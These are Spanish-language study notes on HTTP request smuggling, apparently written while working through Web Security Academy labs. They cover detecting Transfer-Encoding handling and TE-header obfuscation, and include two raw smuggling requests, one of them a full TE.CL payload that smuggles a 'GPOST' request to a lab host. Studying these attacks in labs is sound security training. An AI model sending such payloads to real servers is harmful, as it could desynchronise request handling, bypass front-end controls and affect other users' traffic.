La forma de confirmar que el backend está usa Transfer-Encoding:
![[Pasted image 20240801085807.png]]
En este caso obtendríamos una reject inmediata porque X es inválido sin un número que aclare los bytes previamente

Para confirmar que está usando Transfer-Encoding:
~~~
POST /ABOUT HTTP/1.1
Host: example.com
Transfer-Encoding: chunked           
Content-Length: 6           

0

X
~~~
![[Pasted image 20240731173627.png]]
Que acepte la siguiente petición significa que tanot el frontend como el backend están utilizando trasfer-encoding
![[Pasted image 20240801091016.png]]
El frontend dropea la equis y el backend, leyendo también el body acepta la petición como válida. Esto es (además de una incorrecta sanetización) indicativo a que ambas usan TE.

La ofuscación del TE (TE obfuscating) consiste

EL frontend acepta la petición pero al tener los dos Transfer-Encoding duplicados el backend lo niega y se queda solo con el Transfer-Encoding. Esto puede pasar porque tienen diferentes versiones de los servidores web, tal vez un nginx en el frontend y un caddy en el backend, o ambos usan caddy pero deiferentes versiones
![[Pasted image 20240801091815.png]]
Por lo que el ataque se torna en una especie de TE.CL
![[Pasted image 20240801094705.png]]
La siguiente petición, si esta igual (nunca olvidar los carriage) retorna un 200 OK
![[Pasted image 20240801094852.png]]

```
POST / HTTP/1.1

Host: 0ab000f504d4904a8048eef4005900ea.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 4

Transfer-Encoding: chunked

Transfer-Encoding: foobar



5c

GPOST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 11



X=1

0




```